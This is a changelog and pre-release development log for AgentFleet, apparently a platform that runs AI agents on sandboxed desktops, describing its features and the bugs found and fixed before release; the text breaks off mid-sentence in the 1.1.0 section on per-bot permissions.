# Changelog

Notable changes to AgentFleet. The format is loosely
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and versions follow
semantic versioning.

## [1.0.0] — 2026-09-01

**The first public release.** Everything below this section is the pre-release
development log — kept, because documenting what was broken and how it was
found is part of what this project is. The version numbers inside it were
internal milestones on a private repository, not published releases; 1.0.0 is
the first version anyone outside could install.

What ships in 1.0.0:

- **Sandboxed desktops.** Each agent gets a disposable Ubuntu/XFCE desktop —
  a hardened container by default, or a **real virtual machine** with
  `"driver": "qemu"` (guest disk converted from the container image, KVM when
  the host has it). Cgroup limits, no swap, optional nftables egress policy,
  sudo gated by the setuid bit and revocable at runtime.
- **A perceive-decide-act loop** over screenshots, Set-of-Marks badges and the
  AT-SPI accessibility tree, with per-model coordinate-space calibration,
  perceptual-hash stall detection, and a 33-action vocabulary where the
  parser, the runner and the prompt provably agree.
- **Watch and take over.** Every desktop streams live into the console over
  noVNC; click the stream and you are driving. Auditors get a genuinely
  view-only second VNC server. The README's demo is a real uncut run.
- **Teaching by demonstration**, compiled into editable `SKILL.md` procedures
  that agents follow and refine after successful runs.
- **Escalation like an employee**: a CAPTCHA, MFA prompt or stall parks the
  task and pings the phone app with the screen frozen at that moment.
- **Models**: Ollama, OpenAI, Anthropic, Gemini, Antigravity and any
  OpenAI-compatible gateway behind one interface, with fallback chains,
  role-based model combinations, live model discovery, and per-bot chains.
- **MCP client**: JSON-RPC 2.0 over stdio and Streamable HTTP — tools,
  resources and prompts, with catalogues refreshed on the server's own
  `list_changed` announcement. Agents reach all three through `call_mcp`.
- **Fleet collaboration**: peer messaging over a durable bus, a shared work
  catalog, swarms with an enforced planning phase (`plan_first`) and peer
  review of artifacts, and parallel DAG pipelines with conditional branches
  whose runs survive an orchestrator restart.
- **Semantic memory by default**: a local embedding sidecar in the compose
  stack, provider embeddings preferred when configured, and
  `/api/memory/fleet` reporting which scheme is live.
- **Cost telemetry** with live pricing fetched daily (offline fallback table,
  provenance reported), cached-token discounts, durable across deploys.
- **Webhooks that know their senders**: GitHub, Stripe (real signature
  schemes, replay-bounded), HubSpot (v3/v1), Salesforce outbound messages
  (SOAP, org-id checked, Ack returned) — plus cron triggers.
- **Voice**: a Pocket-TTS sidecar giving every agent, the console and the
  phone the same six voices; the agent's `speak` action plays in the console.
- **A Python SDK and `fleetctl` CLI**, archetype packages
  (`.agentfleet.yaml`), organisations/departments/per-bot permissions, API
  keys, and a Flutter companion app for Android, iOS, macOS, Linux and
  Windows.

MIT licensed. The README's *Design limits, stated plainly* section is the
honest boundary list, and keeping it truthful outranks making it short.

---

# Pre-release development log

Internal milestones from the private repository, newest first. Version
numbers below were never published.

## [unreleased at the time]

### The QEMU driver is real

`"driver": "qemu"` on instance create boots the sandbox as an actual virtual
machine. The trick that keeps it honest is the guest disk: it is converted
from the sandbox container image at build time (`make sandbox-vm`, using
`mke2fs -d` — no privileges, no loop mounts), so the VM runs byte-for-byte
the same agentd, desktop and supervisord config as the container tier and the
two cannot drift. A tiny init mounts kernel filesystems, configures SLIRP's
fixed addresses statically, imports the sandbox environment from the kernel
command line, and hands off to the same entrypoint the container runs.

KVM acceleration is detected, not configured — `/dev/kvm` is granted when the
host has it and requested-then-dropped when it does not (the same
engine-error-is-the-only-signal lesson the GPU fallback taught), falling back
to TCG software emulation: same guest, slow boot, and the runner logs which
mode it chose. Each boot runs on a qcow2 overlay over the pristine base disk.
QEMU's port forwards put agentd and both VNC servers on the runner's own
address, so the orchestrator's health checks, desktop proxy and addressing
are identical for both drivers.

Stated boundaries, fail-closed where it matters: egress policies are refused
on this driver (nftables programs the container netns; the guest's traffic
tunnels through SLIRP underneath it — a policy would look applied and bind
nothing); no GPU on the VM tier yet; and the console's launch dialog does not
offer the driver field yet — it is API-only.

### The demo video is real

`scripts/demo-video.mjs` records the launch demo from the running console,
uncut: the goal typed on camera, a real vision model (qwen3.8-27b-vision over
a LAN Ollama) driving the sandbox, and the finish. The first successful take
produced an accidental honesty lesson: given shell access, the agent skipped
Firefox entirely and answered via curl in two steps — efficient, honest, and
cinematically dead — so the shipped demo runs on a bot with shell access OFF,
which forces the GUI path the product actually sells.

Setting the recording up surfaced a deployment bug worth more than the video:
the admin console's nginx resolved the api's address once at startup, so
recreating the api container (any deploy) left the console answering 502
until the admin container was also restarted. The proxy now resolves through
Docker's embedded DNS per-request.

### Semantic memory ships by default

The last feature-shaped entry in the design-limits list is gone: the compose
stack now includes a local embedding sidecar (`embed/`, model2vec
potion-base-8M — ~30 MB of static embeddings baked into the image, CPU-only,
no network needed at runtime), and the orchestrator falls back to it when no
configured provider can embed. A fleet on Anthropic alone, or with no
providers at all, gets semantic recall out of the box: "sign in to the billing
portal" now finds "logged into the invoicing site with the shared credential"
(cosine 0.32 against 0.05 for an unrelated sentence, measured on the live
sidecar) — the exact case the hashed keyword index could never match.
Provider embeddings still win on quality when configured;
`EMBED_BASE_URL=off` restores the keyword fallback deliberately, and
`/api/memory/fleet` reports whichever scheme is live.

Bringing it up found a boot race: the api probed for an embedder exactly once
at startup, and the sidecar loads its model a few seconds slower — so the
fleet stayed on the keyword index until the next api restart while a healthy
sidecar sat unused. The probe now retries over three minutes, and compose
starts the sidecar before the api.

### The partly-built list is now empty of unbuilt features

The five buildable items in the README's "What is partly built" section are
built; the section is renamed "Design limits, stated plainly" and holds only
the two entries that were never missing features — Anthropic having no
embedding API, and a container not being a VM — because faking a build for a
fact about the world is the disease this list exists to prevent.

- **MCP resources and prompts.** The bridge now speaks all three capability
  groups: `resources/list`/`read` and `prompts/list`/`get` alongside tools,
  paginated, with a server that answers -32601 for an optional group read as
  "none" rather than "broken". Agents reach them through `call_mcp` with
  `mcp_resource` or `mcp_prompt`; the API serves them at `/api/mcp/resources`
  and `/api/mcp/prompts`. Server notifications are no longer discarded: a
  `notifications/*/list_changed` on either transport re-fetches the catalogue
  on its own, and the manual refresh button re-fetches all three groups.
  Pinned by tests against a real subprocess MCP server.
- **Swarm phases are enforced.** A swarm created with `plan_first` starts its
  members on planning goals, refuses any non-plan artifact while planning
  ("the swarm is still in its planning phase..."), lifts the barrier by itself
  when every member's plan artifact is in, and hands each executor the agreed
  plans. `POST /api/swarms/{id}/advance` is the operator override for a stuck
  member. Without `plan_first`, behaviour is unchanged.
- **Pipeline runs survive a restart.** Runs are written through on every node
  transition and rehydrated at boot; one interrupted mid-flight resumes from
  its last settled node — settled results and already-decided branches kept,
  the mid-flight node re-dispatched, and a run whose pipeline was deleted
  closed out instead of left `running` forever. Pinned by a death-and-rebirth
  test across two engine instances sharing one store.
- **Model pricing is fetched.** OpenRouter's public catalogue is loaded at
  boot and daily, used only on an exact normalised model-name match (fuzzy
  matching a hosted catalogue is how a local model gets billed at someone
  else's rate), with the hand-maintained table as the offline fallback and
  `PRICING_REFRESH=off` for air-gapped fleets. The financial summary now
  reports the pricing source and its age.
- **HubSpot and Salesforce are parsed properly.** HubSpot deliveries verify
  with the real v3 signature (method+uri+body+timestamp, replay-bounded) or
  v1, and summarise the actual event array. Salesforce outbound messages are
  parsed as the SOAP XML they are, authenticate by matching the payload's
  OrganizationId against the stored secret (15- and 18-character forms both),
  and get the SOAP Ack back — without which Salesforce records the delivery
  failed and retries the same mission for 24 hours. The generic `crm` kind
  remains for form backends, now explicitly described as the heuristic it is.

### The README shows the product now

The hero is a live capture of what the pitch actually is: one agent's own XFCE
desktop streaming into the console, Firefox open, with the task panel and the
teach-by-demonstration recorder beside it — and the caption saying the true
thing, that clicking the stream takes over the agent's mouse and keyboard. A
companion-app section shows the phone screens. All of it is reproducible:
`make screenshots` (console), `make hero-shot` (the live desktop),
`make app-screenshots` (the Flutter app, captured from its web build — added
for the capture tooling; the shipped platforms are unchanged).

Taking the screenshots found two real bugs, which is the argument for taking
them from a running system rather than mocking:

- **Firefox's "Welcome to Firefox" terms modal was not suppressed.** The
  sandbox ships an enterprise policy file precisely to keep first-run dialogs
  away from agents, but `SkipTermsOfUse` was nested inside `UserMessaging`,
  where Firefox silently ignores it — it is a top-level policy. Every fresh
  sandbox opened its first page under a modal the agent had to click through.
- **The app's Pipelines screen described the old engine.** Conditions were
  badged "not enforced" in warning orange and the caption said stages run one
  at a time — both true when written, both false since the engine was rebuilt.
  A screen understating the product is the same defect as one overstating it.

### Relicensed to MIT

The project moves from PolyForm Noncommercial 1.0.0 to the MIT License —
commercial use, redistribution and SaaS deployment are all permitted with
attribution. Every declaration now agrees: the LICENSE file, the README badge and
license section, `sdk/python/pyproject.toml` (field and classifier),
`admin/package.json`, CONTRIBUTING's grant, and the pull-request template. All
code to date is the copyright holder's own work plus AI-generated contributions,
so no outside contributor consent was required.

The README's *What is partly built* list was also re-verified against the code,
claim by claim — the two newest entries (swarm phases recorded but never gated
on; CRM webhook parsing being a field-name heuristic, not vendor schemas) were
confirmed true as written before shipping them.

This one is narrow and unglamorous: the README carried a section called *What is
partly built*, nine items long, and every item is now built. Several of them were
stubs behind working-looking screens, which is worse than a missing feature — the
screen says the thing works.

### MCP is a real client

It spoke no protocol at all. Registering a server invented one tool named
`<server>_query`, `CallTool` returned a formatted string claiming it had executed
something, and the transport, command, URL and env fields were stored and never
read once. Registrations died with the process. No agent could reach any of it,
because `call_mcp` was not in the parser's accepted action set — a model told
about the fleet's MCP tools got "unknown action" back and lost a step.

Now: JSON-RPC 2.0 over a child process on stdin/stdout, or Streamable HTTP with
either a JSON or an SSE response body; the `initialize`/`initialized` handshake,
which several servers require before they will answer `tools/list` at all;
paginated tool discovery; one connection per server for the whole fleet, lazily
reconnected when one dies. Registrations persist. Agents call tools with
`call_mcp`, and the system prompt lists what they can call — an action with no
discoverable catalogue is one a model will never use.

Registering connects before storing, so a typo is a 400 the operator reads rather
than a server that lists an invented tool and fails at call time. A tool that
runs and reports failure is distinguished from a transport error; only the second
retires the session.

Found while testing it: `ListServers` serialised the env map, which holds bearer
tokens and API keys, and `/api/mcp/servers` is open to every authenticated role.

### Swarms do something

The coordinator was a CRUD store over a message list. Creating a swarm appended
one "Swarm mission initialized" message and did nothing else — no tasks, no
instances started — and with no members specified the API fabricated three bots
that exist on no fleet, so Mission Control showed a running mission staffed
entirely by fiction.

Members are now resolved against real instances before anything is stored, and
creating a swarm starts a real task per member, each told the mission, its own
role, and the names of its teammates. Publishing an artifact starts a review task
on every other member; `SwarmArtifact.ApprovedBy` existed with nothing able to
fill it in, so "verified deliverable" meant nothing had verified it. A reviewer
cannot approve twice to stand in for two reviewers, a rejection retracts an
earlier approval, and a one-bot swarm says there is nobody to review rather than
treating the artifact as approved.

### Pipelines fan out, and edges mean something

The engine ran nodes one at a time and ignored every `condition` on every edge —
so a graph drawn with a success branch and a failure branch ran both, and a
pipeline built to have three bots review something in parallel took three times
as long as it needed to.

Independent stages now run concurrently, bounded per pipeline because every stage
starts a real task on a real desktop. Conditions are evaluated and validated at
save, so a misspelled one is a 400 rather than a branch that silently never
fires. A stage whose condition is not met is skipped rather than failed, and
skipping propagates — a failure branch must not fire under a stage that never
ran. A failure with an explicit failure branch does not fail the run.

There was also no graph builder: the console's create button posted a hardcoded
three-node pipeline and every other screen was a viewer, so an existing pipeline
could not be edited at all.

### Voice reaches the speaker

The agent's `speak` action went to agentd, which synthesised a sine wave
modulated by the text's letter frequencies, base64'd it into a response field
nothing read, and returned success — in a container with no audio device and no
path to the operator. It now synthesises against the same sidecar the console
uses, stores the audio as a task artifact, and emits `agent.speech` on the event
bus, which is the path the sandbox never had.

The sidecar's own default voice was `echo` while every document and picker said
`shadow`. The console's "Pocket TTS voice co-pilot" was `window.speechSynthesis`
and never contacted the sidecar at all.

### Memory is embeddings, and is shared

It scored with a 128-dimension hashed bag of words, which finds a memory when the
query reuses its words and misses it otherwise: "how do I sign in to the billing
portal" never matched "logged into the invoicing site with the shared
credential". Real embeddings now come from whichever provider can produce them,
with the hashed vector as a fallback the API reports honestly rather than
presenting as semantic search.

Vectors from different models are never compared — a cosine similarity between
two unrelated spaces is a number with no meaning, and that is what makes a
half-migrated index worse than either scheme alone.

And it was per-bot: `remember` always wrote to the recording agent's private
namespace and nothing ever wrote to a shared one, so the fleet-wide memory the
docs describe held nothing. Agents can now mark a finding as fleet-wide. Notes
about a person stay private regardless.

Separately: `AutoIndexTask` wrote every completed task's summary to a namespace
that `recall` did not search, so the whole auto-indexed trajectory history was
written, stored and read by nothing.

### Webhooks understand their senders

GitHub happens to match the generic HMAC scheme but puts the event name in a
header, so every push, review comment and failed CI run arrived as an
indistinguishable blob of JSON. Stripe does not match it at all — it signs
`<timestamp>.<body>` and sends the result in `Stripe-Signature` — so a Stripe
webhook pointed at this endpoint was rejected on 100% of deliveries.

Both are implemented properly, Stripe's replay window and rotation-era multiple
signatures included, and each sender gets a summariser so an agent is told what
happened rather than handed raw JSON. Amounts are converted from minor units, so
1999 reads as 19.99 rather than telling an agent someone was charged nineteen
hundred dollars.

The console could not create a webhook at all: the backend requires a signing
secret, correctly, and the form never sent one.

### Cost accounting counts

Cached tokens were summed from a field nothing populated, so the column read zero
forever — and on an agent loop resending the same system prompt every turn, cache
reads are most of the input spend. All three providers report it under different
names, and Anthropic reports cache reads *outside* `input_tokens`, so the prompt
total had to be reassembled. Cache reads are priced at the discounted rate.

While there: the `token_telemetry` table has existed since migration 0007 with
nothing ever writing to it, so the whole cost dashboard reset to $0.00 on every
deploy.

### Archetype packages install

`fleetctl hub export` built a manifest with tools and recorded skills hardcoded
empty, wrote it as `.agentfleet.json` while the docs and the module docstring
both said `.agentfleet.yaml`, and `hub import` read the file back and printed a
summary. It created nothing, and there was no endpoint behind it.

Export now comes from the orchestrator, which knows the things the SDK cannot —
the fleet's recorded skills and its MCP registrations. Import creates the skills,
registers the servers, and optionally provisions a bot. Credentials are
deliberately excluded from a package: the MCP env map is exported as key names
only, and the importer names what has to be supplied. Skills that already exist
are skipped rather than overwritten unless asked.

### `developer-heavy` starts

The tier asked for `agentfleet/sandbox:latest-dev` and nothing built that tag, so
choosing it produced an instance stuck on a missing image.
`sandbox/Dockerfile.dev` and `make sandbox-dev` build it — compilers, Rust, Go,
ccache and the GPU loader hints, layered on the base image so agentd cannot drift
from it, with a build-time check that each toolchain can actually compile and run
something.

Building the image was not enough, which only became apparent from provisioning
one. `tiers.go` had said for a long time that the profiles were advisory and that
"Manager clamps the result to what the host can actually admit"; nothing clamped
anything. The tier's 8 vCPU went straight to Docker, and asking for more CPUs
than the host has is a hard 400 — arriving after the image had been pulled. So on
any machine with fewer than 8 cores the tier could not start at all, whether or
not its image existed.

vCPU is now clamped to the host's core count, memory to 80% of host RAM (a
sandbox that can only reach its limit by pushing the host into swap takes the
orchestrator with it), and shm to half the memory limit. The reductions are
logged and the instance's stored profile shows what it actually got — a panel
reading "8 vCPU" over a container limited to 4 is the same species of lie as a
screen fronting a feature that does nothing.

The GPU needed a different approach. It cannot be detected in advance: Docker
Desktop registers the `nvidia` runtime whether or not an adapter exists, so the
runtime list says yes and the prestart hook says no — and the failure lands as a
generic 500 from `/start` with the hook's stderr embedded. Starting the container
is the only authoritative test, so a start failure that names the NVIDIA tooling
retries once without the GPU and labels the instance `gpu_unavailable`. The match
is deliberately narrow; silently dropping a capability for an unrelated start
failure would hide a real problem behind a working-looking sandbox.

Verified by provisioning one on a 4-core, no-GPU host: it reaches `running` with
a profile reporting 4 vCPU and `gpu: false`, and C, Rust and Go all compile and
run inside it.

### A test for the class of bug this was

`scripts/verify-features.sh`, wired up as `make verify-features`. It registers a
real MCP server in a container and calls a tool on it, checks that pipeline
conditions and cycles are rejected at save, that a swarm refuses members that are
not real instances, and that a Stripe delivery signed the way Stripe signs it is
accepted while the old body-only HMAC is not.

It exists because unit tests could not have caught most of what was wrong here.
The MCP bridge passed every test it had while speaking no protocol at all — the
tests asserted the shape of the response, which was correct, rather than that
anything had been executed. Stripe webhooks were rejected on 100% of real
deliveries while the generic HMAC tests stayed green.

There is also a mechanical check that the parser's accepted action set and the
prompt's advertised set are identical in both directions. That mismatch is what
made `call_mcp` and `speak` unreachable, and it is invisible in review.

### Also

- The Flutter app did not compile. Two `ReorderableListView` call sites passed
  `onReorderItem`, which is not a parameter the widget has, and a comment claimed
  the callback already accounted for the removed item — it does not, so dragging
  downwards landed one place short. That list is a bot's model fallback order,
  where one place short means a different model answers.
- `renderGoal` decided whether to append the raw payload by checking the template
  for `{{` *after* substitution, so a goal that had already used the payload got
  the whole thing appended underneath it.
- The `agent.speech` event had no listener. Routing `speak` to the sidecar and
  storing the audio stopped one step short of anyone hearing it — the same shape
  as the bug it replaced, where the sandbox generated audio nothing consumed. The
  console now plays it and shows the transcript. The phone app speaks its own
  chat replies through the same sidecar but does not subscribe to this event, so
  the action's outcome line says "played in the operator's console" rather than
  claiming an app listener that is not there.
- `SECURITY-REVIEW.md` carried a duplicated F10 finding.


## [internal milestone 1.2.0] — 2026-08-30

Seventy-two commits since the 1.1.0 notes were written. Where v1.1.0 was about
several of each thing, this is about the agents producing something you can
keep, about telling administration apart from use, and — for most of the second
half — about the difference between a fleet that looks busy and one that is
getting work done.

A great deal of that second half came from watching runs fail rather than from
reading code. An agent sent to test an app could read its source but had no way
to run it; the browser it was meant to use had been wedged for an hour; half
its clicks were timing out inside `xdotool`. Each of those looked, from the
outside, like an agent that could not follow instructions.

### A shared work catalog

Agents could message each other and share credentials but had nowhere to put
the work itself, so whatever one produced lived in its container and died with
it — a second bot asked to build on it had to be told what to rebuild rather
than handed the thing.

They now publish files, workspaces, and *apps*: one self-contained HTML
document each, which the phone renders and runs from a third tab in Vault. Two
new actions, `publish_work` and `read_work`, both keyed by name, because agents
refer to each other's work by what it is called. Publishing an existing name is
an edit that bumps the version.

An app runs from a string rather than a URL, so it has an opaque origin, no
cookies and no access to the app's token, and the view injects a
Content-Security-Policy that denies it any network at all. Content that is not
a web page is refused at publish time with a message telling the agent what to
do instead — a bot published a Python file as an app, and nothing had stopped
it. The publish-time scan for external references is a courtesy that catches an
honest mistake early; the policy is what actually holds, since a URL built at
runtime walks past any scan.

### API keys, and disabling people

There was no way in but a password login returning a short-lived token, so
anything automated had to be handed somebody's password. Keys are issued per
user and per purpose, carry their owner's role, record when they were last
used, and are stored only as a hash. Revoking a key, or disabling the account
it belongs to, stops it at the next request.

Accounts can now be disabled rather than deleted — deleting cascades a
person's keys away and orphans what they made — and an administrator can reset
a password, which on a deployment with no mail server is the only way back in.

### Administration is its own place

Users, departments, AI connections and API keys moved to an Admin tab that only
administrators see. They used to sit in Settings, offered to everyone, with the
server doing the refusing.

Provider connections, model combinations and per-bot fallback chains are now
admin-only, reading included. Listing was open to any signed-in user and the
mutating routes needed only operator, so someone handed a single bot to drive
could read every provider's base URL and OAuth client id and rewrite the chain
the whole fleet falls back through.

### A bot can belong to several departments

`instances.org_id` held exactly one, so a bot two teams both relied on had to be
filed under one of them and be invisible to the other. Membership is a join
table now and permission checks take the union across a bot's departments:
sharing widens who can reach a machine and never narrows it.

### Personality, voice and pace, per bot

Each bot carries its own personality, prefilled at creation from the one its
archetype ships with — which nothing had ever read, so every bot was created
with an empty one — and editable at any time. Voice speed joins voice as a
per-bot setting.

### Agents that hand work to each other

Asked to build something together, four agents each replied that they would
build the whole thing — three of them saying they would "take the lead". Each
was being asked in isolation, so "do not duplicate a colleague" was advice
about people it could not see.

Naming an agent now puts it first, and since replies are generated one at a
time, the order you name people is the order parts get claimed. Matching is
fuzzy: `reasercher`, `tool check`, `TOOL-CHECK` and `@Builder's` all find the
right agent, with tolerance scaled to name length so a bot called `Bob` still
has to be spelled right. Each agent is handed the clause between its own name
and the next one and told that is its part, and is shown what colleagues have
already claimed.

Finishing a part now wakes whoever the next part belongs to, with what was
produced. Work flows design → build → test → review, and a review goes back to
whoever built, because a review nobody acts on is decoration. Testing and
reviewing wait to be handed something rather than starting immediately — you
cannot test what does not exist, and an agent that starts anyway is busy when
the builder finally publishes. The relay is bounded at six rounds.

An agent doing its part of a broadcast is told plainly that the request was
made to the fleet rather than in a conversation, so nobody is waiting to answer
questions about it — it should decide the small things and say what it decided.
The eight-minute wait itself is unchanged for a task an operator started
directly, where somebody may well be watching.

Work one agent hands another does not wait for a person. It arrives with
instructions from a colleague, nobody is standing by to answer, and each wait
holds up everyone downstream — one run spent three eight-minute waits inside
twenty minutes and reached two hops. Afterwards the same pipeline ran three
hops in under ten. An operator's own task still waits the full eight minutes,
because that is the case where somebody might actually reply.

The shared work tab is a file system. The catalog had folders in the data and a
flat list in the app: you could see what was in a workspace but not put anything
there, move anything out, rename anything, or change a file without asking an
agent to republish it. It now walks folders with a breadcrumb, and everything
can be created, renamed, moved, edited or deleted. Runnable items keep a tap for
"play" and put the rest behind a long press, because a game is still a file.

The editor colours what it shows — HTML, CSS, JavaScript, JSON, Dart, Go,
Python, shell, SQL, YAML and Markdown — picked from the file name and then from
the content, since agents publish "rollr" rather than "rollr.html".

Demonstration recording produces something usable. Stopping a recording used to
fail outright with "unsupported Unicode escape sequence": the trace contained a
NUL, which was the Shift key — `keysym_to_string(Shift_L)` returns a
one-character string, so a modifier passed the test for "a character was typed".
That also split typing in two around it. Shifted punctuation was recorded
unshifted, so a demonstration of typing a `file://` URL came back with a
semicolon. Keys that are not characters had no name at all and rendered as
"Press " with nothing after it.

Recorded steps now carry a picture and a description taken from it. A step used
to be a coordinate and, where the application exposed one, an accessible label —
and Firefox exposes nothing, so a browser demonstration compiled to "Click at
690,121 (no accessible label was exposed)". The recorder takes a small frame at
each moment worth one, and the compiler asks the vision model what is at the
point that was touched, so the step reads "Click element labelled \"the address
bar at the top of the browser\"".

Firefox's Terms of Use dialog no longer covers a fresh profile. `SkipOnboarding`
suppresses the tour but not that dialog; the earlier onboarding fix only
appeared to work because the profile it was tested on already existed.

An app in the catalog can no longer be replaced by something that is not one.
A tester published its report under the app's own name; the report was filed as
a file, took the app's place, and the working app was gone. Publishing over a
name is how a fix reaches the thing it fixes, so the name is not the problem —
changing what the thing is, is.

A mislabelled publish is filed rather than refused. A tester that had just
finished testing an app published its findings as one, was refused with a clear
explanation, did not act on it, and a run's entire output was lost to a wrong
word. Content that is plainly not a web page is now filed as a file. Something
that was trying to be a page and failed is still refused.

Every agent is told the same thing about reaching shared work. The handoff
brief explained that `read_work` opens what it finds; a task started directly
from a broadcast did not, so an agent went looking for the app in the desktop's
application launcher while it sat open in a browser window behind.

Clicks no longer fail with "mousemove failed: timed out after 15s". `xdotool
mousemove --sync` waits for a motion event, and moving the pointer somewhere it
already is produces none, so it blocked for the full timeout — clicking the
same button twice was enough to trigger it. An agent told a button cannot be
reached concludes the button is broken; the button was fine. A run that had
been losing roughly half its clicks now loses none.

A sandbox browser that has stopped answering is replaced. One had been wedged
for over an hour — "Firefox is already running, but is not responding" — and
every agent sent to test something was driving a dead browser: clicks landing
on nothing, typing accumulating in an address bar that never navigated. No bot
can recover that for itself; they have no shell, and the browser is the thing
they were sent to use. `read_work` also opens what it places, so the page is on
screen rather than something the agent has to navigate to.

Agents can now run the work they are asked to test. `read_work` writes anything
a browser can show into the sandbox and leads its answer with the `file://`
path. A tester sent to try an app could previously read its source and nothing
else: one spent forty steps looking for somewhere to run it — typing
`http://localhost:8080/rollr.html`, which nothing serves, then searching the
web and landing on a real company that happens to share the name. The copy
travels through the orchestrator's channel into the container rather than the
agent's, so it works with shell access turned off, which is how every bot in
this fleet is configured.

Typing a URL replaces the address bar instead of appending to it. `type`
appends, so an agent retrying an address built one out of every attempt —
`.../work/rollr.htmlfile:///home/agent/work/rollr.htmlhttp://localhost:8080/...`
— and the page never loaded, which read as the page being broken rather than
the typing being wrong.

Firefox no longer opens on its first-run onboarding modal. An agent sent to
test a web page found a "Welcome to Firefox" dialog over it, clicked Continue,
got a nearly identical onboarding panel, and was judged to be clicking into the
void — two test runs died without ever reaching the page they were sent to.

A sandbox whose container has been removed is rebuilt on start instead of
failing. The instance kept pointing at a container id that no longer existed,
so every start returned a 404 with a docker hash in it and the agent was
bricked with no way back from the UI, by something as routine as `docker
prune`.

Who starts work is decided by mention order. A tester named first — "ToolCheck
open the app from the catalog and test it, Builder fix what ToolCheck reports"
— used to register as waiting to be handed a build nobody had asked for, and
the request never happened. Whoever is named first starts; everyone named after
them waits to be handed it.

The test and review hops name the file they publish. Told only to "publish your
findings as a file", each round invented a fresh name, so one app collected
five defect reports and none of them was obviously the current one.

A job is no longer called dead while the agent asked to do it is busy. The
notice fired at 14:37 saying a builder would not come back to a request, and
that builder started it at 14:42: a busy agent's reply is queued behind its
model call, not dropped, so following the advice would have built the thing
twice.

Model capabilities come from Ollama rather than from the model's name. Vision
support was decided by looking for "vl", "vision" or "llava" in the name, and
the default model in `.env.example` reports vision but was offered as
text-only. The same request exposed that discovery with a blank `base_url` —
what both clients send when the provider's field is empty — defaulted to
localhost, which inside the API container is nothing, so it quietly served the
curated catalogue and listed models the machine has never had.

The stuck-agent check no longer counts actions that were never going to move
the screen. An agent working the shared catalogue publishes and reads over the
API; judging those steps by whether the desktop changed marked correct work as
stuck, and one run filed twenty-six "appears stuck" alerts in half an hour
while doing its job properly. Because a task that has stopped to ask counts as
busy, that agent was also silently out of the fleet the whole time. Stalls are
capped as well: three rounds of stalling and carrying on ends the task.

A job where every agent is waiting and nobody was asked to make anything now
says so in the thread, naming who is stuck and what would unstick them. It used
to sit silently, while the agents' own replies — "I will test the thing" — read
exactly like work starting. When the agent who was asked to produce something
is merely busy, the notice says that instead: an agent does not come back to a
broadcast it was busy for, and telling the operator to "name a builder" when
they just named one sends them round the same loop.

Naming agents also says who is not needed: if the message names anybody, only
the named start work, and the rest are told plainly that it is not their job.
Asked for one small thing from one agent, two others had started writing their
own version of it — being shown a colleague's claim helps, but whether a model
declines should not decide whether the fleet does the work three times.

Each hop carries an instruction in its own terms: fix these defects and
republish under the same name; try it as a user would and name the line; read
it as somebody who will maintain it. "Do your part" was not something a model
could act on — handed a review to apply, the builder stopped to ask what was
wanted instead of applying it.

A finished web page is filed as an app whatever the agent called it. Asked for
`work_kind: "app"`, agents repeatedly published complete HTML documents as
files, so they sat in the catalog as a wall of source with no way to run them.
A broken app no longer fails silently either: JavaScript that does not parse
used to give a Play button that showed a blank screen, which looks the same as
a game that has not drawn yet, so the error is now shown in the viewer.

Republishing identical content is a no-op rather than a new version, and an
agent that publishes the same name three times in one run is told it is going
in circles. One had published the same file ten times, which looked like
progress and was none, and meant the run never ended and the colleague waiting
to test it never got the chance. Fixing that is what let the full circle run:
Builder → ToolCheck → Auditor → Builder, with both testers independently
finding the same real bug in a dice roller — `String.fromCharCode(55+value)`
renders a roll of 1 as "8".

### Agents that do not stall

An agent that stopped to ask a person waited six hours and then failed the
task. It now waits eight minutes, records that nobody answered, and carries on
with its own judgement — and if it asks a second time it is answered at once
rather than waiting again.

A question an agent stopped to ask is closed when its task ends. Sixty open
alerts had accumulated over six hours, every one of them belonging to a task
that had already finished — a queue of agents needing you in which nothing was
actually waiting. Completion and failure notices are untouched: those are meant
to be read rather than answered.

A task parked for a person kept its answer in a goroutine that died with the
process, so any restart abandoned it forever; and because a parked task counts
as busy, its agent never became free again. That is how this deployment reached
fifty-nine open alerts and four bots that would not take work. Such tasks are
resumed on startup and their alerts closed.

Alerts also raise a notification now. Push needs a Firebase project this
deployment does not have — no `google-services.json`, no `FCM_PROJECT_ID`, zero
registered devices — so the only code path that reached the notification plugin
was the Firebase handler, and nothing ever fired. The event socket already
carries the alert, so that now shows one. It needs the app to be running, which
real push would not.

### Fixed

- **Fleet comms answered every message as a status update.** Asked to work
  together and build something, four agents each replied "I am currently idle
  and available" and nobody did anything. The prompt behind those replies was
  written to answer "what is everyone up to" and told the agent never to claim
  it had started anything. An agent now tells a request from a question, and a
  request produces a plan that starts real work.
- **Sandboxes were addressed by a pinned IP.** Docker hands out a new address
  every restart, so after a host reboot one bot pointed at a dead address — a
  500 on every desktop call — and another pointed at an address a *different*
  bot had since been given, which would have shown one agent's desktop under
  another's name. They are addressed by container alias now, and reconcile
  repairs stale addresses instead of only syncing lifecycle state.
- **The read-only desktop had never worked across a restart.** `VNCViewURL` had
  no database column at all, so it was empty after every restart and every
  auditor was refused with a message blaming the age of the instance.
- **Half of every API key issued was dead on arrival.** The key parser split on
  every underscore and the secret half is base64url, whose alphabet contains
  one.
- **A cancelled run reported a broken provider.** Stopping a task mid-inference
  surfaced as "every model provider failed: context canceled", which sends
  whoever reads it to check engines that are working perfectly.
- **`/api/orgs` returned 500 to every caller.** Two raw SQL statements still
  queried the dropped `instances.org_id`; searching for the Go field name does
  not look inside query strings. A test now reads the SQL and fails if it
  happens again.
- **A new chat opened at the bottom of its list.** Threads were ordered by last
  message and a new one has none, so making a chat put it where it was hardest
  to find.
- **A new chat made from the broadcast was not a broadcast.** It carried the
  current roster as a member list, so it grouped apart from the everyone
  channel and silently excluded every bot added afterwards.

### Changed

- The default local vision model is `qwen3.5:4b`, in `.env.example`, the
  compose default, the code fallback and the model catalogue — which still
  advertised the previous one as "Default" and did not list qwen3.5 at all.

---

## [internal milestone 1.1.0] — 2026-08-29

Eighty-two commits since v1.0.0. The theme is that v1.0.0 was built for one operator
and one bot at a time, and this release is about several of each: departments
with their own people and machines, several models with different jobs, several
conversations with the same agent, and pipelines that put several bots in a row.

It also contains a security fix that matters — a command injection reachable by
any operator who could create a bot — and a crash that could take the whole
orchestrator down.

### Organisations, departments and per-bot permissions

Access used to be three global roles, which meant every operator could see,
drive and delete every bot in the fleet and read every shared credential. That is
workable for one person and wrong for an organisation, where the questions are
"which bots" and "how much".

- **Organisations (departments)** with their own members and org roles. An org
  role answers "what does someone at this level normally do", set once per
  department.
- **Per-bot permission grants** answer "except for this one" — the contractor who
  may drive a single machine, the auditor who may read one bot's transcripts and
  nothing else. A grant wins outright, including when it is empty: that is how a
